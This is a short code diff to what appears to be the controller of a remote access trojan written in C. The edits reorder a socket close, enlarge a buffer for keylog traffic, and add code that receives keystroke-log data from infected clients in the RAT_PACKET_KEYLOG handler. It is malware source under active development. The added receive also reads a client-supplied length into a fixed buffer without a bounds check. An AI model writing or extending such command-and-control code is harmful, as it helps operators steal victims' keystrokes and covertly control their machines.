@@ -35,8 +35,8 @@ static void init_server_socket(SOCKET *server) {
   printf("listening...\n");
   if (listen(*server, SOMAXCONN) == SOCKET_ERROR) {
     printf("listen failed, error: %d\n", WSAGetLastError());
-    *server = INVALID_SOCKET;
     closesocket(*server);
+    *server = INVALID_SOCKET;
     return;
   }
 }
@@ -57,7 +57,7 @@ static SOCKET accept_client(SOCKET server) {
 
 static void *client_input_handler(void *vargp) {
   SOCKET client = (SOCKET)vargp;
-  char client_buf[DEFAULT_BUFLEN];
+  char client_buf[DEFAULT_KEYLOG_BUFLEN];
   ratpacket_t *p = (ratpacket_t *)client_buf;
   int allocated = 0;
   while (1) {
@@ -95,7 +95,8 @@ static void *client_input_handler(void *vargp) {
       printf("%s", p->data);
       break;
     case RAT_PACKET_KEYLOG:
-      puts("keylog");
+      LOG_DEBUG("keylog");
+      recbytes = recv(client, (char *)p->data, p->data_len, 0);
       break;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
